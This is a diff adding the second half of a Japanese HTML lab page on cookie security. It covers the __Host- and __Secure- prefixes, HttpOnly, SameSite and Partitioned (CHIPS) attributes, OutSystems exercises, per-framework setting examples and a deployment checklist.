+    サーバー側の設定ミスを防ぐ安全装置です。
+  </p>
+
+  <div class="two-col">
+    <div class="col-card">
+      <h4 style="color:var(--accent);">__Host- プレフィックス（最も安全）</h4>
+      <pre>強制される条件:
+  ✅ Secure 属性が必須
+  ✅ Path=/ が必須
+  ✅ Domain 属性が未指定（省略）
+
+Set-Cookie: __Host-session=abc;
+  Path=/; Secure; HttpOnly; SameSite=Lax
+
+効果:
+  → サブドメインへの共有を完全に防止
+  → Cookie固定攻撃を防止
+  → HTTPS以外では設定不可
+  → サブドメイン攻撃対策として特に強力
+    （admin.example.comが侵害されても
+     __Host- Cookie は上書き不可能）
+
+条件を満たさない場合:
+  → ブラウザが Cookie を拒否する</pre>
+    </div>
+    <div class="col-card">
+      <h4 style="color:var(--accent2);">__Secure- プレフィックス</h4>
+      <pre>強制される条件:
+  ✅ Secure 属性が必須
+
+Set-Cookie: __Secure-token=xyz;
+  Domain=example.com; Path=/;
+  Secure; HttpOnly; SameSite=Lax
+
+効果:
+  → HTTPS でのみ設定可能を保証
+  → Domain の明示は許可される
+    （サブドメイン共有が可能）
+
+__Host- より緩い:
+  → Domain共有が必要な場合に使用</pre>
+    </div>
+  </div>
+
+  <div class="step">
+    <div class="step-num">STEP 1 — プレフィックスの動作を確認</div>
+    <button class="btn btn-accent" id="btn-prefix-test">プレフィックス付き Cookie を設定してみる</button>
+    <pre id="prefix-result"><span class="placeholder">← ボタンを押すと結果が表示されます</span></pre>
+  </div>
+
+  <script>
+    document.getElementById('btn-prefix-test').addEventListener('click', () => {
+      const el = document.getElementById('prefix-result');
+      const isHttps = location.protocol === 'https:';
+
+      // __Host- はHTTPSでかつSecure+Path=/+Domain未指定でのみ設定可能
+      document.cookie = '__Host-test=value1; Path=/; Secure; Max-Age=60';
+      // __Secure- はHTTPSでかつSecureでのみ設定可能
+      document.cookie = '__Secure-test=value2; Path=/; Secure; Max-Age=60';
+      // 通常のCookie（比較用）
+      document.cookie = 'normal_test=value3; Path=/; Max-Age=60';
+
+      const cookies = document.cookie;
+      el.textContent = '設定を試みました（環境: ' + location.protocol + '）:\n\n'
+        + '1. __Host-test=value1 (Secure; Path=/)\n'
+        + '   → ' + (isHttps ? 'HTTPS環境: 設定成功の可能性あり' : 'HTTP環境: ブラウザが拒否（Secure 必須）') + '\n\n'
+        + '2. __Secure-test=value2 (Secure)\n'
+        + '   → ' + (isHttps ? 'HTTPS環境: 設定成功の可能性あり' : 'HTTP環境: ブラウザが拒否（Secure 必須）') + '\n\n'
+        + '3. normal_test=value3（比較用）\n'
+        + '   → 設定成功\n\n'
+        + 'document.cookie:\n  ' + (cookies || '(空)') + '\n\n'
+        + (isHttps
+          ? '→ Application タブで __Host-test, __Secure-test の有無を確認'
+          : '→ HTTP環境のため __Host- / __Secure- は設定不可。\n  OutSystems（HTTPS）の実験 5-E で確認してください。');
+    });
+  </script>
+
+  <div class="warn-box">
+    <strong>プレフィックスの検証はブラウザが行う</strong>:
+    <code>__Host-</code> で始まる Cookie に <code>Domain=example.com</code> を付けると、
+    ブラウザがその Cookie を<strong>無視（拒否）</strong>します。サーバー側のエラーではなく、
+    ブラウザ側で強制される安全装置です。
+  </div>
+</div>
+
+<!-- ── 実験 5-E: OutSystems ── -->
+<div class="lab-box" id="exp-5e">
+  <h3>実験 5-E: OutSystems でセキュアな Cookie を設定する</h3>
+  <p>OutSystems 環境（HTTPS）では、全てのセキュリティ属性を実際に設定・確認できます。</p>
+
+  <div class="step">
+    <div class="step-num">STEP 1 — セキュアな Cookie 設定メソッドを作成</div>
+    <pre><span class="comment">// Service Studio — HeaderLab モジュール</span>
+
+1. HeaderTest に新しいメソッドを追加:
+   名前: <span class="header-val">SetSecureCookie</span>
+   HTTP Method: <span class="header-val">GET</span>
+
+2. Output Parameter:
+   名前: <span class="header-val">Message</span> (Text型)
+
+3. フロー内で複数の Set-Cookie を設定:
+
+   <span class="comment">// パターン A: 最も安全（推奨）</span>
+   <span class="highlight">SetResponseHeader("Set-Cookie",
+     "__Host-session=secure123; Path=/; Secure; HttpOnly; SameSite=Lax")</span>
+
+   <span class="comment">// パターン B: HttpOnly なし（比較用）</span>
+   <span class="highlight">SetResponseHeader("Set-Cookie",
+     "visible_cookie=readable; Path=/; Secure; SameSite=Lax; Max-Age=300")</span>
+
+   <span class="comment">// パターン C: SameSite=Strict</span>
+   <span class="highlight">SetResponseHeader("Set-Cookie",
+     "strict_cookie=strict123; Path=/; Secure; HttpOnly; SameSite=Strict; Max-Age=300")</span>
+
+4. Assign: Message = "Secure cookies set"
+5. <span class="highlight">Publish</span></pre>
+  </div>
+
+  <div class="step">
+    <div class="step-num">STEP 2 — 動作確認</div>
+    <pre><span class="comment">// ブラウザでアクセス:</span>
+https://&lt;env&gt;.../rest/HeaderTest/SetSecureCookie
+
+<span class="comment">// DevTools → Application → Cookies で確認:</span>
+
+  Name              HttpOnly  Secure  SameSite
+  ─────────────────────────────────────────────
+  __Host-session    ✅        ✅      Lax       ← 最も安全
+  visible_cookie    ❌        ✅      Lax       ← JSから読める
+  strict_cookie     ✅        ✅      Strict    ← 最も厳格
+
+<span class="comment">// Console タブで確認:</span>
+&gt; document.cookie
+<span class="header-val">"visible_cookie=readable"</span>
+<span class="comment">// → __Host-session と strict_cookie は表示されない（HttpOnly）</span>
+
+<span class="comment">// Network タブで別ページにアクセスし、Cookie ヘッダーを確認:</span>
+<span class="header-name">Cookie</span>: __Host-session=secure123; visible_cookie=readable; strict_cookie=strict123
+<span class="comment">// → HttpOnly Cookie も送信はされている！（読めないだけ）</span></pre>
+  </div>
+
+  <div class="note">
+    <strong>OutSystems のセッション Cookie を観察する</strong>:
+    OutSystems が自動設定する Cookie（<code>nr1...</code>, <code>osVisitor</code> 等）の
+    Secure / HttpOnly / SameSite 属性も確認してみてください。
+    プラットフォームがどのようなセキュリティ設定を採用しているかがわかります。
+  </div>
+</div>
+
+<!-- ── 推奨設定パターン ── -->
+<div class="lab-box" id="bestpractice">
+  <h3>実務での推奨 Cookie 設定パターン</h3>
+
+  <table class="cookie-table">
+    <thead>
+      <tr><th>用途</th><th>推奨 Set-Cookie</th><th>理由</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>セッション管理</strong></td>
+        <td><code>__Host-session=abc; Path=/; Secure; HttpOnly; SameSite=Lax</code></td>
+        <td>最も安全。XSS盗取防止 + CSRF軽減 + MITM防止 + サブドメイン分離</td>
+      </tr>
+      <tr>
+        <td><strong>CSRF トークン</strong></td>
+        <td><code>__Host-csrf=token; Path=/; Secure; SameSite=Strict</code></td>
+        <td>HttpOnly なし（JSから読み取ってフォームに埋め込む必要がある）</td>
+      </tr>
+      <tr>
+        <td><strong>ユーザー設定</strong><br>(テーマ, 言語)</td>
+        <td><code>preferences=dark; Path=/; Secure; SameSite=Lax; Max-Age=31536000</code></td>
+        <td>HttpOnly 不要（JSから読み取る）。長期保存</td>
+      </tr>
+      <tr>
+        <td><strong>サードパーティ埋め込み</strong></td>
+        <td><code>__Secure-embed=xyz; Path=/; Secure; HttpOnly; SameSite=None; Partitioned</code></td>
+        <td>SameSite=None + Secure 必須。Partitioned(CHIPS) でトラッキング防止</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <div class="danger-box">
+    <strong>避けるべき設定パターン</strong>:<br>
+    <code>❌ Set-Cookie: session=abc</code> — 属性なし。全ての攻撃に対して無防備<br>
+    <code>❌ Set-Cookie: session=abc; Domain=example.com</code> — Domainを広げすぎ。サブドメインのXSSで盗取可能<br>
+    <code>❌ Set-Cookie: session=abc; SameSite=None</code> — Secure なしの SameSite=None はブラウザが拒否<br>
+    <code>❌ document.cookie でセッションIDを設定</code> — HttpOnly が付けられない
+  </div>
+</div>
+
+<div class="lab-box" id="chips">
+  <h3>補足: CHIPS（Partitioned Cookie）— 2026年の現状</h3>
+  <p>サードパーティCookieの廃止が進む中、<code>Partitioned</code> 属性が事実上の代替手段として定着しています。</p>
+
+  <div class="step">
+    <div class="step-num">Partitioned Cookie の設定例</div>
+    <pre>Set-Cookie: __Host-embed=abc123;
+  Secure;
+  HttpOnly;
+  SameSite=None;
+  Partitioned;
+  Path=/
+
+<span class="comment">// → トップレベルサイトごとに分離保存される
+// → クロスサイトトラッキングを防止しつつ、
+//   埋め込みウィジェットの状態は保持できる</span></pre>
+  </div>
+
+  <div class="two-col">
+    <div class="col-card">
+      <h4 style="color:var(--accent);">ブラウザ対応状況（2026年3月）</h4>
+      <pre><span class="header-name">Safari (ITP)</span>: 3rd party Cookie 完全ブロック
+<span class="header-name">Firefox (ETP)</span>: デフォルトブロック
+<span class="header-name">Chrome</span>: ユーザーが選択可能
+         Incognito ではデフォルトブロック
+         <span class="highlight">Partitioned 対応済み</span></pre>
+    </div>
+    <div class="col-card">
+      <h4 style="color:var(--accent2);">推奨組み合わせ</h4>
+      <pre><span class="highlight">__Host-</span> プレフィックス
+  + <span class="highlight">Secure</span>
+  + <span class="highlight">HttpOnly</span>
+  + <span class="highlight">SameSite=Lax</span>（同一サイト用）
+  または
+  + <span class="highlight">SameSite=None; Partitioned</span>（埋め込み用）</pre>
+    </div>
+  </div>
+</div>
+
+<hr>
+<h2 id="framework">🔧 フレームワーク別設定例</h2>
+<p style="font-size:0.85rem;color:var(--text-dim);">このLabで学んだヘッダーを各環境で設定する方法です。</p>
+
+<div style="overflow-x:auto;">
+<table style="width:100%;border-collapse:collapse;font-size:0.78rem;font-family:'IBM Plex Mono',monospace;margin:1rem 0;">
+  <thead>
+    <tr style="background:var(--surface2);color:var(--accent2);">
+      <th style="padding:0.6rem;border:1px solid var(--border);text-align:left;min-width:120px;">環境</th>
+      <th style="padding:0.6rem;border:1px solid var(--border);text-align:left;">設定方法</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="padding:0.6rem;border:1px solid var(--border);color:var(--accent);white-space:nowrap;">Express</td>
+      <td style="padding:0.6rem;border:1px solid var(--border);"><code>res.cookie('session', value, { secure: true, httpOnly: true, sameSite: 'lax' })</code></td>
+    </tr>
+    <tr>
+      <td style="padding:0.6rem;border:1px solid var(--border);color:var(--accent);white-space:nowrap;">Next.js</td>
+      <td style="padding:0.6rem;border:1px solid var(--border);"><code>// API Route: cookies().set('session', value, { secure: true, httpOnly: true, sameSite: 'lax' })</code></td>
+    </tr>
+    <tr>
+      <td style="padding:0.6rem;border:1px solid var(--border);color:var(--accent);white-space:nowrap;">Nginx</td>
+      <td style="padding:0.6rem;border:1px solid var(--border);"><code>proxy_cookie_flags ~ secure httponly samesite=lax;</code></td>
+    </tr>
+    <tr>
+      <td style="padding:0.6rem;border:1px solid var(--border);color:var(--accent);white-space:nowrap;">OutSystems</td>
+      <td style="padding:0.6rem;border:1px solid var(--border);"><code>SetCookie("session", value) + Secure/HttpOnly はプラットフォーム設定</code></td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+<div class="note" style="border-color:var(--accent3);background:#f3e8fd;">
+  🔗 <strong style="color:var(--accent3);">多層防御クロスリファレンス</strong>：Cookie の <code>HttpOnly</code> + <code>SameSite</code>（このLab）に加え、<a href="http-header-lab-08.html">Lab 08 の CSP</a> で <code>script-src</code> を制限し、<a href="http-header-lab-09.html">Lab 09 の HSTS</a> で通信経路を保護すると、XSS・CSRF・中間者攻撃を同時に防御できます。
+</div>
+
+<!-- ── チェックリスト ── -->
+<hr>
+<h2 id="checklist">✅ Lab 05 チェックリスト</h2>
+<p style="font-size:0.82rem; color:var(--text-dim);">チェック状態はブラウザに自動保存されます。</p>
+
+<div class="check-item"><input type="checkbox" data-key="lab05-1"> <label>Secure 属性付き Cookie が HTTP 環境では設定できないことを体感した</label></div>
+<div class="check-item"><input type="checkbox" data-key="lab05-2"> <label>HttpOnly Cookie が document.cookie で読み取れないことを Console で確認した</label></div>
+<div class="check-item"><input type="checkbox" data-key="lab05-3"> <label>HttpOnly Cookie も自動送信はされることを Network タブで確認した</label></div>
+<div class="check-item"><input type="checkbox" data-key="lab05-4"> <label>SameSite の Strict / Lax / None の違いと CSRF 防止メカニズムを確認した</label></div>
+<div class="check-item"><input type="checkbox" data-key="lab05-5"> <label>__Host- プレフィックスが Secure + Path=/ + Domain未指定を強制することを確認した</label></div>
+<div class="check-item"><input type="checkbox" data-key="lab05-6"> <label>OutSystems で __Host- / HttpOnly / SameSite 付き Cookie を設定して Application タブで確認した</label></div>
+<div class="check-item"><input type="checkbox" data-key="lab05-7"> <label>用途別の推奨 Cookie 設定パターンを把握した</label></div>
+<div class="check-item"><input type="checkbox" data-key="lab05-8"> <label>Partitioned（CHIPS）がサードパーティCookieのトラッキング防止に有効であることを確認した</label></div>
+
+<div style="margin-top:1rem; text-align:center;">
+  <span id="progress-text" style="font-family:'IBM Plex Mono',monospace; color:var(--accent); font-size:0.9rem;"></span>
+</div>
+
+<script>
+  const STORAGE_PREFIX = 'httplab_';
+  function updateProgress() {
+    const all = document.querySelectorAll('input[type="checkbox"][data-key]');
+    const checked = [...all].filter(cb => cb.checked).length;
+    const el = document.getElementById('progress-text');
+    if (!el) return;
+    if (checked === all.length) {
+      el.innerHTML = '🎉 <strong>全 ' + all.length + ' 項目完了！Lab 06（CORS基礎）へ進みましょう！</strong>';
+    } else if (checked >= all.length - 2) {
+      el.textContent = checked + ' / ' + all.length + ' 完了 — あと少し！';
+    } else {
+      el.textContent = checked + ' / ' + all.length + ' 完了';
+    }
+  }
+  document.querySelectorAll('input[type="checkbox"][data-key]').forEach(cb => {
+    const saved = localStorage.getItem(STORAGE_PREFIX + cb.dataset.key);
+    if (saved === 'true') { cb.checked = true; cb.closest('.check-item')?.classList.add('checked'); }
+    cb.addEventListener('change', () => {
+      localStorage.setItem(STORAGE_PREFIX + cb.dataset.key, cb.checked);
+      cb.closest('.check-item')?.classList.toggle('checked', cb.checked);
+      updateProgress();
+    });
+  });
+  updateProgress();
+</script>
+
+<hr>
+
+<div class="lab-box" style="border-color:var(--warn);">
+  <h3 style="color:var(--warn);margin-top:0;">🚀 本番環境で確認すべきこと</h3>
+  <p style="font-size:0.82rem;color:var(--text-dim);">このLabの内容をデプロイ前に確認するチェックリストです。</p>
+  <div style="padding:0.3rem 0;font-size:0.85rem;">☐ セッションCookieに <code>Secure; HttpOnly; SameSite=Lax</code> が設定されている</div>
+  <div style="padding:0.3rem 0;font-size:0.85rem;">☐ <code>__Host-</code> プレフィックスを使用している（または使用できない理由を把握している）</div>
+  <div style="padding:0.3rem 0;font-size:0.85rem;">☐ <code>Domain</code> 属性を省略している（不要なサブドメインへのCookie送信を防止）</div>
+  <div style="padding:0.3rem 0;font-size:0.85rem;">☐ <code>Max-Age</code> / <code>Expires</code> がセッションの用途に対して適切に設定されている</div>
+  <div style="padding:0.3rem 0;font-size:0.85rem;">☐ サードパーティ埋め込みが必要な場合、<code>SameSite=None; Secure; Partitioned</code> を使用している</div>
+</div>
+
+<div class="note">
+  📖 <strong>参照資料</strong>：このLabの内容は <code>http-headers-guide-v2.md</code> の 第3部 3-4「Cookie属性リファレンス」+ 第2部③「認証サーバー」 に対応しています。より詳しい解説・ヘッダー一覧はガイドを参照してください。
+</div>
+
+<h2>📝 Lab 05 学習ノート</h2>
+<p style="font-size:0.82rem; color:var(--text-dim);">メモはブラウザに自動保存されます。</p>
+<textarea id="notes" rows="6" placeholder="気づいたこと、疑問点をメモ..."
+  style="width:100%;background:var(--surface);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);padding:0.8rem;font-family:'Noto Sans JP',sans-serif;font-size:0.9rem;resize:vertical;margin-top:0.5rem;"></textarea>
+<script>
+  const notesEl = document.getElementById('notes');
+  const savedNotes = localStorage.getItem(STORAGE_PREFIX + 'lab05_notes');
+  if (savedNotes) notesEl.value = savedNotes;
+  notesEl.addEventListener('input', () => { localStorage.setItem(STORAGE_PREFIX + 'lab05_notes', notesEl.value); });
+</script>
+
+<div style="margin-top:2rem; display:flex; justify-content:space-between; font-size:0.82rem; color:var(--text-dim);">
+  <span>← 前回: <a href="http-header-lab-04.html"><strong>Lab 04 — Cookie基礎</strong></a></span>
+  <span>次回: <a href="http-header-lab-06.html"><strong>Lab 06 — CORS基礎</strong></a>（Origin, Access-Control-Allow-Origin, プリフライト）→
+  <br><span style="color:var(--text-dim);font-size:0.78rem;">Cookie セキュリティを学んだら、次はクロスオリジン通信（CORS）の制御へ進みます</span></span>
+</div>
+
+</body>
+</html>
